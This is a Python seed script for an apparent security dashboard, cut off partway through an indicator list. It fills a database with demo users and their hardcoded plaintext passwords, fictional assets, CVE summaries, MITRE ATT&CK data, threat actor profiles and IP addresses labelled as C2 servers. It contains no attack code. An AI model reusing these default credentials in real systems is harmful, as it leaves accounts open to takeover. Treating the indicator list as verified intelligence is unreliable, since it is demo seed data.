from datetime import datetime, timedelta
import random
from pc_auth import get_password_hash
from models import *


def seed_database(db):
    now = datetime.utcnow()

    # ── Users ────────────────────────────────────────────────────────────────
    users_data = [
        ("admin", "admin@purpleclaw.io", "PurpleClaw@2024!", "Admin User", UserRole.admin),
        ("sarah.chen", "sarah.chen@purpleclaw.io", "Analyst@2024!", "Sarah Chen", UserRole.analyst),
        ("marcus.red", "marcus.red@purpleclaw.io", "RedTeam@2024!", "Marcus Rodriguez", UserRole.red_team),
        ("lisa.blue", "lisa.blue@purpleclaw.io", "BlueTeam@2024!", "Lisa Park", UserRole.blue_team),
        ("john.viewer", "john.viewer@purpleclaw.io", "Viewer@2024!", "John Smith", UserRole.viewer),
        ("devika.ops", "devika.ops@purpleclaw.io", "Ops@2024!", "Devika Sharma", UserRole.analyst),
    ]
    users = []
    for uname, email, pwd, full, role in users_data:
        u = User(username=uname, email=email, hashed_password=get_password_hash(pwd),
                 full_name=full, role=role, is_active=True, last_login=now - timedelta(hours=random.randint(1,48)))
        db.add(u); db.flush(); users.append(u)

    # ── Assets ───────────────────────────────────────────────────────────────
    assets_data = [
        ("DC-PROD-01", AssetType.server, "10.0.1.10", "dc-prod-01.corp.local", "Windows Server 2022", Criticality.critical, "IT", "Domain Controllers"),
        ("DC-PROD-02", AssetType.server, "10.0.1.11", "dc-prod-02.corp.local", "Windows Server 2022", Criticality.critical, "IT", "Domain Controllers"),
        ("DC-DR-01",   AssetType.server, "10.0.1.12", "dc-dr-01.corp.local",   "Windows Server 2019", Criticality.critical, "IT", "Domain Controllers"),
        ("WEB-PROD-01", AssetType.server, "10.0.2.10", "web-prod-01.corp.local", "Ubuntu 22.04", Criticality.high, "DevOps", "Web Servers"),
        ("WEB-PROD-02", AssetType.server, "10.0.2.11", "web-prod-02.corp.local", "Ubuntu 22.04", Criticality.high, "DevOps", "Web Servers"),
        ("WEB-STAGING", AssetType.server, "10.0.2.20", "web-staging.corp.local", "Ubuntu 20.04", Criticality.medium, "DevOps", "Web Servers"),
        ("DB-PROD-01",  AssetType.database, "10.0.3.10", "db-prod-01.corp.local", "Windows Server 2019", Criticality.critical, "DBA", "Databases"),
        ("DB-PROD-02",  AssetType.database, "10.0.3.11", "db-prod-02.corp.local", "Ubuntu 22.04", Criticality.critical, "DBA", "Databases"),
        ("DB-ANALYTICS",AssetType.database, "10.0.3.20", "db-analytics.corp.local","Ubuntu 20.04", Criticality.high, "Analytics", "Databases"),
        ("MAIL-SERVER", AssetType.server, "10.0.4.10", "mail.corp.local", "Windows Server 2019", Criticality.high, "IT", "Mail"),
        ("FILE-SERVER",  AssetType.server, "10.0.4.11", "files.corp.local", "Windows Server 2022", Criticality.high, "IT", "File Servers"),
        ("VPN-GW-01",    AssetType.network_device, "192.168.1.1", "vpn-gw-01.corp.local", "FortiOS 7.4", Criticality.critical, "NetOps", "VPN"),
        ("FW-CORE-01",   AssetType.firewall, "192.168.1.2", "fw-core-01.corp.local", "Palo Alto PAN-OS 10.2", Criticality.critical, "NetOps", "Firewalls"),
        ("FW-DMZ-01",    AssetType.firewall, "192.168.1.3", "fw-dmz-01.corp.local", "Cisco ASA 9.18", Criticality.critical, "NetOps", "Firewalls"),
        ("SW-CORE-01",   AssetType.switch, "10.0.0.1", "sw-core-01.corp.local", "Cisco IOS 15.7", Criticality.high, "NetOps", "Switches"),
        ("SW-ACCESS-01", AssetType.switch, "10.0.0.2", "sw-access-01.corp.local", "Cisco IOS 15.7", Criticality.medium, "NetOps", "Switches"),
        ("WS-FIN-001",  AssetType.workstation, "10.1.1.101", "ws-fin-001.corp.local", "Windows 11", Criticality.medium, "Finance", "Workstations"),
        ("WS-FIN-002",  AssetType.workstation, "10.1.1.102", "ws-fin-002.corp.local", "Windows 11", Criticality.medium, "Finance", "Workstations"),
        ("WS-HR-001",   AssetType.workstation, "10.1.2.101", "ws-hr-001.corp.local",  "Windows 10", Criticality.medium, "HR", "Workstations"),
        ("WS-HR-002",   AssetType.workstation, "10.1.2.102", "ws-hr-002.corp.local",  "Windows 10", Criticality.low,    "HR", "Workstations"),
        ("WS-EXEC-001", AssetType.workstation, "10.1.3.101", "ws-exec-001.corp.local","Windows 11", Criticality.high,   "Executive", "Workstations"),
        ("WS-DEV-001",  AssetType.workstation, "10.1.4.101", "ws-dev-001.corp.local", "macOS 14.2", Criticality.medium, "Engineering", "Workstations"),
        ("WS-DEV-002",  AssetType.workstation, "10.1.4.102", "ws-dev-002.corp.local", "Ubuntu 22.04",Criticality.medium,"Engineering", "Workstations"),
        ("AWS-EC2-WEB-01",  AssetType.cloud_instance, "172.31.10.10", "ec2-54-23-12-1.compute-1.amazonaws.com", "Amazon Linux 2023", Criticality.high, "DevOps", "AWS-US-EAST"),
        ("AWS-EC2-WEB-02",  AssetType.cloud_instance, "172.31.10.11", "ec2-54-23-12-2.compute-1.amazonaws.com", "Amazon Linux 2023", Criticality.high, "DevOps", "AWS-US-EAST"),
        ("AWS-EC2-API-01",  AssetType.cloud_instance, "172.31.20.10", "ec2-52-14-10-1.compute-1.amazonaws.com", "Ubuntu 22.04", Criticality.high, "DevOps", "AWS-US-EAST"),
        ("AWS-RDS-PROD-01", AssetType.database, "172.31.30.10", "rds-prod-01.abc123.us-east-1.rds.amazonaws.com", "Amazon RDS MySQL 8.0", Criticality.critical, "DBA", "AWS-US-EAST"),
        ("AWS-EKS-NODE-01", AssetType.container, "172.31.40.10", "ip-172-31-40-10.ec2.internal", "Amazon EKS 1.28", Criticality.high, "DevOps", "AWS-US-EAST"),
        ("CONTAINER-APP-01",AssetType.container, "172.17.0.10", "app-container-01", "Docker 24.0", Criticality.medium, "DevOps", "Containers"),
        ("CONTAINER-NGINX",  AssetType.container, "172.17.0.11", "nginx-container-01", "Docker 24.0", Criticality.medium, "DevOps", "Containers"),
        ("IOT-HVAC-01",      AssetType.iot, "10.9.0.10", "hvac-controller-01", "Embedded Linux", Criticality.low, "Facilities", "IoT"),
        ("IOT-CAMERA-01",    AssetType.iot, "10.9.0.20", "cam-lobby-01", "RTOS", Criticality.low, "Security", "IoT"),
        ("MOBILE-EXEC-01",   AssetType.mobile, "DHCP", "iphone-ceo-01", "iOS 17.3", Criticality.high, "Executive", "Mobile"),
        ("APP-SALESFORCE",   AssetType.application, "SaaS", "salesforce.corp.local", "Salesforce", Criticality.high, "Sales", "SaaS"),
        ("APP-JIRA",         AssetType.application, "SaaS", "jira.corp.local", "Atlassian Jira Cloud", Criticality.medium, "Engineering", "SaaS"),
    ]
    assets = []
    port_sets = {
        AssetType.server: [22, 80, 443, 3389],
        AssetType.workstation: [135, 139, 445, 3389],
        AssetType.database: [1433, 3306, 5432, 27017],
        AssetType.firewall: [22, 443, 8443],
        AssetType.network_device: [22, 23, 161, 443],
        AssetType.cloud_instance: [22, 80, 443, 8080],
        AssetType.container: [80, 443, 8080, 8443],
        AssetType.switch: [22, 23, 161],
        AssetType.router: [22, 23, 161],
        AssetType.iot: [80, 443, 8080],
        AssetType.mobile: [],
        AssetType.application: [],
    }
    risk_vals = {"critical": 85.0, "high": 65.0, "medium": 40.0, "low": 15.0}
    for name, atype, ip, host, os_v, crit, dept, grp in assets_data:
        ports = port_sets.get(atype, [])
        a = Asset(name=name, type=atype, ip_address=ip, hostname=host,
                  os=os_v.split()[0] if " " in os_v else os_v,
                  os_version=os_v,
                  status=AssetStatus.active if random.random() > 0.1 else AssetStatus.unknown,
                  criticality=crit, owner="IT Operations", location="HQ",
                  department=dept, group_name=grp,
                  tags=[dept.lower(), grp.lower().replace(" ", "-")],
                  open_ports=ports, services=[],
                  risk_score=risk_vals[crit.value] + random.uniform(-10, 10),
                  last_seen=now - timedelta(minutes=random.randint(1, 60)))
        db.add(a); db.flush(); assets.append(a)

    # ── Vulnerabilities ───────────────────────────────────────────────────────
    vulns_data = [
        ("CVE-2021-44228", "Apache Log4Shell Remote Code Execution", 10.0, Severity.critical, True, True,
         "A remote code execution vulnerability exists in Apache Log4j2 due to improper deserialization of JNDI lookups.",
         ["Apache Log4j2 2.0-beta9 through 2.15.0"], "2021-12-10"),
        ("CVE-2020-1472", "Zerologon - Netlogon Privilege Escalation", 10.0, Severity.critical, True, True,
         "An elevation of privilege vulnerability exists when an attacker establishes a vulnerable Netlogon secure channel connection to a domain controller.",
         ["Windows Server 2008", "Windows Server 2012", "Windows Server 2016", "Windows Server 2019"], "2020-08-11"),
        ("CVE-2021-26855", "Microsoft Exchange ProxyLogon SSRF", 9.8, Severity.critical, True, True,
         "A server-side request forgery vulnerability in Microsoft Exchange Server that allows an attacker to send arbitrary HTTP requests and authenticate as the Exchange server.",
         ["Microsoft Exchange Server 2013", "2016", "2019"], "2021-03-02"),
        ("CVE-2023-23397", "Microsoft Outlook NTLM Hash Theft", 9.8, Severity.critical, True, True,
         "A privilege escalation vulnerability in Microsoft Outlook that allows an attacker to steal NTLM hashes by sending a specially crafted email.",
         ["Microsoft Outlook 2013-2021"], "2023-03-14"),
        ("CVE-2023-34362", "MOVEit Transfer SQL Injection RCE", 9.8, Severity.critical, True, True,
         "A SQL injection vulnerability in MOVEit Transfer that could allow an unauthenticated attacker to gain unauthorized access to the database.",
         ["MOVEit Transfer before 2023.0.1"], "2023-05-31"),
        ("CVE-2022-26134", "Atlassian Confluence OGNL Injection RCE", 9.8, Severity.critical, True, True,
         "An OGNL injection vulnerability in Atlassian Confluence Server and Data Center allows an unauthenticated remote attacker to execute arbitrary code.",
         ["Atlassian Confluence Server", "Confluence Data Center"], "2022-06-02"),
        ("CVE-2021-34527", "Windows Print Spooler PrintNightmare RCE", 8.8, Severity.high, True, True,
         "A remote code execution vulnerability in the Windows Print Spooler service allows attackers to execute code with SYSTEM privileges.",
         ["Windows 7 through Windows Server 2022"], "2021-07-01"),
        ("CVE-2022-30190", "Microsoft MSDT Follina RCE", 7.8, Severity.high, True, True,
         "A remote code execution vulnerability exists when MSDT is called using the URL protocol from a calling application such as Word.",
         ["Windows 10", "Windows 11", "Windows Server 2022"], "2022-06-01"),
        ("CVE-2021-40438", "Apache HTTP Server SSRF mod_proxy", 9.0, Severity.critical, True, False,
         "A crafted request uri-path can cause mod_proxy to forward the request to an origin server chosen by the remote user.",
         ["Apache HTTP Server 2.4.48 and earlier"], "2021-09-16"),
        ("CVE-2021-21985", "VMware vCenter Server RCE", 9.8, Severity.critical, True, True,
         "The vSphere Client contains a remote code execution vulnerability due to lack of input validation in the Virtual SAN Health Check plug-in.",
         ["VMware vCenter Server 6.5-7.0"], "2021-05-25"),
        ("CVE-2022-22965", "Spring4Shell Spring Framework RCE", 9.8, Severity.critical, True, True,
         "A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution via data binding.",
         ["Spring Framework 5.3.x < 5.3.18", "5.2.x < 5.2.20"], "2022-03-31"),
        ("CVE-2021-27065", "Microsoft Exchange Server ProxyLogon RCE", 7.8, Severity.high, True, True,
         "A post-authentication arbitrary file write vulnerability in Exchange that can be chained with ProxyLogon for RCE.",
         ["Microsoft Exchange Server 2013-2019"], "2021-03-02"),
        ("CVE-2022-1388", "F5 BIG-IP iControl REST Auth Bypass RCE", 9.8, Severity.critical, True, True,
         "Undisclosed requests may bypass iControl REST authentication leading to RCE, file creation/deletion, or disabling of services.",
         ["BIG-IP 16.1.0-16.1.2", "15.1.0-15.1.5", "14.1.0-14.1.4"], "2022-05-04"),
        ("CVE-2023-4863", "WebP Heap Buffer Overflow RCE", 8.8, Severity.high, True, True,
         "Heap buffer overflow in WebP in Google Chrome and other browsers allows a remote attacker to perform an out-of-bounds memory write via a crafted HTML page.",
         ["Chrome < 116.0.5845.187", "Firefox < 117.0.1", "Edge < 116.0.1938.81"], "2023-09-11"),
        ("CVE-2022-41082", "Microsoft Exchange Server SSRF + RCE (ProxyNotShell)", 8.8, Severity.high, True, True,
         "Remote code execution vulnerability in Microsoft Exchange Server when the attacker is authenticated.",
         ["Exchange Server 2013-2019"], "2022-09-29"),
        ("CVE-2022-41040", "ProxyNotShell Server-Side Request Forgery", 8.8, Severity.high, True, True,
         "Exchange Server SSRF vulnerability allowing pre-auth RCE chain with CVE-2022-41082.", ["Exchange Server 2013-2019"], "2022-09-29"),
        ("CVE-2023-0669", "GoAnywhere MFT RCE", 7.2, Severity.high, True, True,
         "A pre-authentication command injection vulnerability in Fortra GoAnywhere MFT.",
         ["GoAnywhere MFT < 7.1.2"], "2023-02-01"),
        ("CVE-2022-47966", "Zoho ManageEngine RCE", 9.8, Severity.critical, True, False,
         "Multiple Zoho ManageEngine products are vulnerable to unauthenticated remote code execution.",
         ["ManageEngine ServiceDesk Plus", "ADSelfService Plus"], "2023-01-10"),
        ("CVE-2022-3236", "Sophos Firewall Code Injection RCE", 9.8, Severity.critical, True, False,
         "A code injection vulnerability in the User Portal and Webadmin of Sophos Firewall.",
         ["Sophos Firewall v19.0 MR1 and older"], "2022-09-23"),
        ("CVE-2021-3156", "sudo Heap-Based Buffer Overflow Privilege Escalation", 7.8, Severity.high, True, True,
         "Heap-based buffer overflow in sudo before 1.9.5p2 allows privilege escalation to root.",
         ["sudo before 1.9.5p2", "Ubuntu", "Debian", "CentOS"], "2021-01-26"),
        ("CVE-2023-38831", "WinRAR Zero-Day Code Execution", 7.8, Severity.high, True, True,
         "A vulnerability in WinRAR allows attackers to execute arbitrary code when a user attempts to view a benign file within a ZIP archive.",
         ["WinRAR < 6.23"], "2023-08-23"),
        ("CVE-2023-24880", "Windows SmartScreen Bypass", 4.4, Severity.medium, False, False,
         "Windows SmartScreen security feature bypass vulnerability.",
         ["Windows 10", "Windows 11", "Windows Server 2022"], "2023-03-14"),
        ("CVE-2022-26923", "Active Directory Certificate Services Escalation", 8.8, Severity.high, True, False,
         "Privilege escalation vulnerability in Active Directory Certificate Services allows authenticated users to obtain a certificate that allows authentication as a domain admin.",
         ["Active Directory Certificate Services"], "2022-05-10"),
        ("CVE-2021-36934", "Windows SAM Database Disclosure HiveNightmare", 7.8, Severity.high, True, False,
         "Improper access control to Windows SAM, SYSTEM, and SECURITY registry hives allows local users to read credential material.",
         ["Windows 10 21H1", "Windows 11"], "2021-07-20"),
        ("CVE-2023-21608", "Adobe Acrobat Use-After-Free RCE", 7.8, Severity.high, True, False,
         "Adobe Acrobat and Reader contain a use-after-free vulnerability that could lead to arbitrary code execution.",
         ["Adobe Acrobat DC < 22.003.20282", "Acrobat 2020 < 20.005.30418"], "2023-01-10"),
    ]
    vulns = []
    for vdata in vulns_data:
        if len(vdata) == 9:
            cve, title, cvss, sev, exploit, wild, desc, prods, pub = vdata
        v = Vulnerability(cve_id=cve, title=title, description=desc,
                          cvss_score=cvss, cvss_v3_score=cvss, severity=sev,
                          exploit_available=exploit, exploit_in_wild=wild,
                          affected_products=prods,
                          published_at=datetime.strptime(pub, "%Y-%m-%d"),
                          modified_at=datetime.strptime(pub, "%Y-%m-%d") + timedelta(days=30))
        db.add(v); db.flush(); vulns.append(v)

    # ── Findings ──────────────────────────────────────────────────────────────
    finding_combos = [
        (0, 0, Severity.critical, FindingStatus.open, 95.0, "scan", "Log4Shell vulnerability detected in monitoring service"),
        (1, 1, Severity.critical, FindingStatus.in_progress, 98.0, "scan", "Zerologon patch missing on DC-PROD-02"),
        (2, 2, Severity.critical, FindingStatus.open, 96.0, "intelligence", "ProxyLogon exposure on mail server"),
        (6, 3, Severity.critical, FindingStatus.open, 94.0, "scan", "Unpatched database server exposed to NTLM relay"),
        (3, 4, Severity.critical, FindingStatus.in_progress, 92.0, "scan", "MOVEit SQL injection found in file transfer service"),
        (0, 6, Severity.high, FindingStatus.open, 78.0, "scan", "PrintNightmare spooler service vulnerable"),
        (16, 7, Severity.high, FindingStatus.open, 82.0, "scan", "Follina MSDT vulnerability on exec workstation"),
        (9, 8, Severity.high, FindingStatus.open, 75.0, "scan", "Apache SSRF via mod_proxy exposed"),
        (7, 9, Severity.critical, FindingStatus.open, 90.0, "scan", "VMware vCenter RCE vulnerability unpatched"),
        (23, 10, Severity.critical, FindingStatus.open, 88.0, "scan", "Spring4Shell in internal Java application"),
        (1, 6, Severity.high, FindingStatus.resolved, 0.0, "scan", "PrintNightmare - resolved via patch"),
        (4, 11, Severity.high, FindingStatus.open, 74.0, "scan", "ProxyLogon post-auth RCE risk on staging"),
        (13, 12, Severity.critical, FindingStatus.open, 91.0, "scan", "F5 BIG-IP auth bypass exposed"),
        (0, 13, Severity.high, FindingStatus.open, 70.0, "scan", "WebP heap overflow - browser clients"),
        (11, 14, Severity.high, FindingStatus.open, 72.0, "scan", "ProxyNotShell on Exchange server"),
        (7, 15, Severity.medium, FindingStatus.open, 55.0, "manual", "Weak TLS configuration on web server"),
        (22, 16, Severity.high, FindingStatus.open, 68.0, "scan", "GoAnywhere MFT RCE detected"),
        (0, 19, Severity.high, FindingStatus.in_progress, 65.0, "scan", "sudo privilege escalation on Linux servers"),
        (4, 20, Severity.high, FindingStatus.open, 60.0, "scan", "WinRAR zero-day on finance workstation"),
        (18, 21, Severity.medium, FindingStatus.open, 42.0, "scan", "SmartScreen bypass possible on HR workstations"),
        (0, 22, Severity.high, FindingStatus.open, 72.0, "manual", "AD CS privilege escalation path identified"),
        (1, 23, Severity.high, FindingStatus.open, 66.0, "scan", "SAM database accessible from local user"),
        (16, 24, Severity.high, FindingStatus.open, 58.0, "scan", "Adobe Acrobat RCE on exec workstation"),
        (3, 18, Severity.critical, FindingStatus.open, 89.0, "scan", "Sophos firewall code injection"),
        (6, 2, Severity.medium, FindingStatus.accepted, 30.0, "manual", "Default credentials on legacy DB admin interface"),
        (5, None, Severity.medium, FindingStatus.open, 45.0, "manual", "HTTP security headers missing on staging web server"),
        (7, None, Severity.low, FindingStatus.open, 20.0, "scan", "Outdated jQuery version in web application"),
        (8, None, Severity.medium, FindingStatus.open, 50.0, "scan", "SSL certificate expiring in 30 days"),
        (0, None, Severity.medium, FindingStatus.in_progress, 48.0, "scan", "SMB signing not required on domain controllers"),
        (1, None, Severity.high, FindingStatus.open, 70.0, "manual", "Kerberoastable service accounts discovered"),
        (3, None, Severity.medium, FindingStatus.open, 44.0, "scan", "Redis server accessible without authentication"),
        (26, None, Severity.high, FindingStatus.open, 67.0, "intelligence", "Container image with known vulnerable packages"),
        (27, None, Severity.critical, FindingStatus.open, 85.0, "scan", "AWS RDS publicly accessible with weak credentials"),
        (24, None, Severity.medium, FindingStatus.open, 40.0, "scan", "EC2 instance metadata service v1 enabled"),
        (2, None, Severity.low, FindingStatus.open, 18.0, "scan", "VPN gateway using deprecated IKEv1"),
    ]
    findings = []
    for fi, (asset_idx, vuln_idx, sev, fstatus, rscore, src, title) in enumerate(finding_combos):
        vid = vulns[vuln_idx].id if vuln_idx is not None and vuln_idx < len(vulns) else None
        aid = assets[asset_idx].id
        f = Finding(asset_id=aid, vulnerability_id=vid, title=title,
                    description=f"Security finding: {title}. Immediate remediation recommended.",
                    severity=sev, status=fstatus, risk_score=rscore, source=src,
                    remediation="Apply vendor patches, implement compensating controls, and monitor for exploitation.",
                    tags=[sev.value, src], mitre_techniques=[],
                    detected_at=now - timedelta(days=random.randint(1, 60)),
                    resolved_at=now - timedelta(days=1) if fstatus == FindingStatus.resolved else None)
        db.add(f); db.flush(); findings.append(f)

    # ── MITRE Tactics ─────────────────────────────────────────────────────────
    tactics_data = [
        ("TA0043", "Reconnaissance", "reconnaissance", "Gathering info to plan future operations"),
        ("TA0042", "Resource Development", "resource-development", "Establishing resources to support operations"),
        ("TA0001", "Initial Access", "initial-access", "Getting into the network"),
        ("TA0002", "Execution", "execution", "Running malicious code"),
        ("TA0003", "Persistence", "persistence", "Maintaining foothold"),
        ("TA0004", "Privilege Escalation", "privilege-escalation", "Gaining higher-level permissions"),
        ("TA0005", "Defense Evasion", "defense-evasion", "Avoiding detection"),
        ("TA0006", "Credential Access", "credential-access", "Stealing credentials"),
        ("TA0007", "Discovery", "discovery", "Figuring out the environment"),
        ("TA0008", "Lateral Movement", "lateral-movement", "Moving through the network"),
        ("TA0009", "Collection", "collection", "Gathering data of interest"),
        ("TA0011", "Command and Control", "command-and-control", "Communicating with compromised systems"),
        ("TA0010", "Exfiltration", "exfiltration", "Stealing data"),
        ("TA0040", "Impact", "impact", "Manipulating, interrupting, or destroying systems"),
    ]
    tactics = []
    for tid, name, short, desc in tactics_data:
        t = MITRETactic(tactic_id=tid, name=name, shortname=short, description=desc,
                        url=f"https://attack.mitre.org/tactics/{tid}/")
        db.add(t); db.flush(); tactics.append(t)

    # ── MITRE Techniques ──────────────────────────────────────────────────────
    techniques_data = [
        ("T1595", "Active Scanning", ["TA0043"], ["Linux","Windows","macOS"]),
        ("T1592", "Gather Victim Host Information", ["TA0043"], ["PRE"]),
        ("T1589", "Gather Victim Identity Information", ["TA0043"], ["PRE"]),
        ("T1590", "Gather Victim Network Information", ["TA0043"], ["PRE"]),
        ("T1598", "Phishing for Information", ["TA0043"], ["Linux","Windows","macOS"]),
        ("T1566", "Phishing", ["TA0001"], ["Linux","Windows","macOS"]),
        ("T1190", "Exploit Public-Facing Application", ["TA0001"], ["Linux","Windows","macOS","Network"]),
        ("T1133", "External Remote Services", ["TA0001","TA0003"], ["Linux","Windows","macOS"]),
        ("T1195", "Supply Chain Compromise", ["TA0001"], ["Linux","Windows","macOS"]),
        ("T1199", "Trusted Relationship", ["TA0001"], ["Linux","Windows","macOS"]),
        ("T1059", "Command and Scripting Interpreter", ["TA0002"], ["Linux","Windows","macOS"]),
        ("T1053", "Scheduled Task/Job", ["TA0002","TA0003"], ["Linux","Windows","macOS"]),
        ("T1204", "User Execution", ["TA0002"], ["Linux","Windows","macOS"]),
        ("T1203", "Exploitation for Client Execution", ["TA0002"], ["Linux","Windows","macOS"]),
        ("T1547", "Boot or Logon Autostart Execution", ["TA0003","TA0004"], ["Linux","Windows","macOS"]),
        ("T1543", "Create or Modify System Process", ["TA0003","TA0004"], ["Linux","Windows","macOS"]),
        ("T1505", "Server Software Component", ["TA0003"], ["Linux","Windows","macOS","Network"]),
        ("T1136", "Create Account", ["TA0003"], ["Linux","Windows","macOS","Azure AD"]),
        ("T1098", "Account Manipulation", ["TA0003","TA0004"], ["Linux","Windows","macOS","Azure AD"]),
        ("T1548", "Abuse Elevation Control Mechanism", ["TA0004","TA0005"], ["Linux","Windows","macOS"]),
        ("T1134", "Access Token Manipulation", ["TA0004","TA0005"], ["Windows"]),
        ("T1078", "Valid Accounts", ["TA0001","TA0003","TA0004","TA0005"], ["Linux","Windows","macOS"]),
        ("T1068", "Exploitation for Privilege Escalation", ["TA0004"], ["Linux","Windows","macOS"]),
        ("T1055", "Process Injection", ["TA0004","TA0005"], ["Linux","Windows","macOS"]),
        ("T1027", "Obfuscated Files or Information", ["TA0005"], ["Linux","Windows","macOS"]),
        ("T1070", "Indicator Removal", ["TA0005"], ["Linux","Windows","macOS","Network"]),
        ("T1112", "Modify Registry", ["TA0005"], ["Windows"]),
        ("T1562", "Impair Defenses", ["TA0005"], ["Linux","Windows","macOS","Network"]),
        ("T1110", "Brute Force", ["TA0006"], ["Linux","Windows","macOS","Azure AD"]),
        ("T1003", "OS Credential Dumping", ["TA0006"], ["Linux","Windows","macOS"]),
        ("T1558", "Steal or Forge Kerberos Tickets", ["TA0006"], ["Windows"]),
        ("T1040", "Network Sniffing", ["TA0006","TA0007"], ["Linux","Windows","macOS","Network"]),
        ("T1606", "Forge Web Credentials", ["TA0006"], ["SaaS","IaaS","Azure AD"]),
        ("T1087", "Account Discovery", ["TA0007"], ["Linux","Windows","macOS","Azure AD"]),
        ("T1083", "File and Directory Discovery", ["TA0007"], ["Linux","Windows","macOS"]),
        ("T1082", "System Information Discovery", ["TA0007"], ["Linux","Windows","macOS"]),
        ("T1016", "System Network Configuration Discovery", ["TA0007"], ["Linux","Windows","macOS"]),
        ("T1057", "Process Discovery", ["TA0007"], ["Linux","Windows","macOS"]),
        ("T1135", "Network Share Discovery", ["TA0007"], ["Linux","Windows","macOS"]),
        ("T1021", "Remote Services", ["TA0008"], ["Linux","Windows","macOS"]),
        ("T1072", "Software Deployment Tools", ["TA0002","TA0008"], ["Linux","Windows","macOS"]),
        ("T1550", "Use Alternate Authentication Material", ["TA0005","TA0008"], ["Linux","Windows","macOS"]),
        ("T1560", "Archive Collected Data", ["TA0009"], ["Linux","Windows","macOS"]),
        ("T1114", "Email Collection", ["TA0009"], ["Linux","Windows","macOS","Office 365"]),
        ("T1213", "Data from Information Repositories", ["TA0009"], ["Linux","Windows","macOS","SaaS"]),
        ("T1005", "Data from Local System", ["TA0009"], ["Linux","Windows","macOS"]),
        ("T1056", "Input Capture", ["TA0006","TA0009"], ["Linux","Windows","macOS"]),
        ("T1113", "Screen Capture", ["TA0009"], ["Linux","Windows","macOS"]),
        ("T1071", "Application Layer Protocol", ["TA0011"], ["Linux","Windows","macOS","Network"]),
        ("T1090", "Proxy", ["TA0011"], ["Linux","Windows","macOS","Network"]),
        ("T1095", "Non-Application Layer Protocol", ["TA0011"], ["Linux","Windows","macOS","Network"]),
        ("T1105", "Ingress Tool Transfer", ["TA0011"], ["Linux","Windows","macOS"]),
        ("T1572", "Protocol Tunneling", ["TA0011"], ["Linux","Windows","macOS"]),
        ("T1041", "Exfiltration Over C2 Channel", ["TA0010"], ["Linux","Windows","macOS"]),
        ("T1048", "Exfiltration Over Alternative Protocol", ["TA0010"], ["Linux","Windows","macOS","Network"]),
        ("T1567", "Exfiltration Over Web Service", ["TA0010"], ["Linux","Windows","macOS"]),
        ("T1485", "Data Destruction", ["TA0040"], ["Linux","Windows","macOS","IaaS"]),
        ("T1486", "Data Encrypted for Impact", ["TA0040"], ["Linux","Windows","macOS","IaaS"]),
        ("T1489", "Service Stop", ["TA0040"], ["Linux","Windows","macOS"]),
        ("T1491", "Defacement", ["TA0040"], ["Linux","Windows","macOS","IaaS"]),
        ("T1499", "Endpoint Denial of Service", ["TA0040"], ["Linux","Windows","macOS","Network"]),
    ]
    techniques = []
    for tid, name, tac_ids, plats in techniques_data:
        t = MITRETechnique(technique_id=tid, name=name, description=f"{name} technique used by adversaries.",
                           tactic_ids=tac_ids, platforms=plats,
                           url=f"https://attack.mitre.org/techniques/{tid}/")
        db.add(t); db.flush(); techniques.append(t)

    # ── ATT&CK Coverage ───────────────────────────────────────────────────────
    coverage_statuses = ["covered", "covered", "partial", "not_covered", "not_covered"]
    detection_types = ["automated", "automated", "manual", "partial", None, None]
    for tech in techniques:
        idx = random.randint(0, len(coverage_statuses)-1)
        covered = coverage_statuses[idx] == "covered"
        partial = coverage_statuses[idx] == "partial"
        cov = ATTACKCoverage(
            technique_id=tech.technique_id,
            covered=covered,
            detection_type=detection_types[idx] if covered or partial else None,
            control_name=random.choice(["SIEM Rule", "EDR Policy", "IDS Signature", "FIM Rule", None]) if covered else None,
            last_tested=now - timedelta(days=random.randint(30, 180)) if covered else None,
            confidence=random.randint(70, 99) if covered else (random.randint(30, 69) if partial else 0),
        )
        db.add(cov)

    # ── Threat Actors ─────────────────────────────────────────────────────────
    actors_data = [
        ("APT29", ["Cozy Bear", "The Dukes", "Midnight Blizzard"], "Russian state-sponsored group targeting government and think tanks", ["espionage"], "nation-state", "Russia", ["T1566","T1078","T1003","T1558","T1071"], ["Government","Healthcare","Energy","Think Tanks"]),
        ("APT41", ["Double Dragon", "Barium", "Winnti"], "Chinese state-sponsored group conducting both espionage and financial crime", ["espionage","financial"], "nation-state", "China", ["T1190","T1059","T1055","T1027","T1486"], ["Technology","Healthcare","Telecom","Finance"]),
        ("Lazarus Group", ["Hidden Cobra", "Guardians of Peace", "APT38"], "North Korean state-sponsored group targeting financial institutions and crypto", ["financial","espionage"], "nation-state", "North Korea", ["T1566","T1486","T1041","T1560","T1071"], ["Finance","Cryptocurrency","Defense","Energy"]),
        ("REvil", ["Sodinokibi"], "Russian-speaking ransomware group operating as RaaS", ["financial"], "organized", "Russia", ["T1486","T1490","T1027","T1070","T1059"], ["Finance","Healthcare","Retail","Manufacturing"]),
        ("Sandworm", ["Voodoo Bear", "Iron Viking", "UAC-0082"], "Russian GRU group focused on destructive attacks against critical infrastructure", ["sabotage","espionage"], "nation-state", "Russia", ["T1485","T1489","T1059","T1562","T1190"], ["Energy","Government","Media","Telecom"]),
        ("Scattered Spider", ["0ktapus", "UNC3944", "Muddled Libra"], "English-speaking social engineering specialists targeting large enterprises", ["financial"], "organized", None, ["T1566","T1078","T1621","T1110","T1056"], ["Technology","Gaming","Telecom","Finance"]),
        ("ALPHV", ["BlackCat", "Noberus"], "Ransomware-as-a-Service group operating since 2021 with Rust-based ransomware", ["financial"], "organized", "Russia", ["T1486","T1041","T1070","T1055","T1027"], ["Healthcare","Finance","Manufacturing","Government"]),
        ("TA505", ["Evil Corp affiliate"], "Financially motivated threat actor known for distributing banking trojans and ransomware", ["financial"], "organized", "Russia", ["T1566","T1204","T1059","T1486","T1041"], ["Finance","Retail","Healthcare"]),
    ]
    actors = []
    for name, aliases, desc, motiv, soph, country, ttps, sectors in actors_data:
        a = ThreatActor(name=name, aliases=aliases, description=desc, motivation=motiv,
                        sophistication=soph, country=country, active=True,
                        ttps=ttps, target_sectors=sectors,
                        tools=["Cobalt Strike","Mimikatz","BloodHound"][:random.randint(1,3)],
                        first_seen=now - timedelta(days=random.randint(500, 3000)),
                        last_seen=now - timedelta(days=random.randint(1, 90)))
        db.add(a); db.flush(); actors.append(a)

    # ── IOCs ──────────────────────────────────────────────────────────────────
    ioc_data = [
        (IOCType.ip, "185.220.101.45", Severity.critical, 95, "APT29 C2 server", "AlienVault OTX"),
        (IOCType.ip, "45.142.212.100", Severity.high, 85, "REvil ransomware C2", "Abuse.ch"),
        (IOCType.ip, "194.165.16.77", Severity.critical, 90, "Lazarus Group C2 infrastructure", "Cisco Talos"),
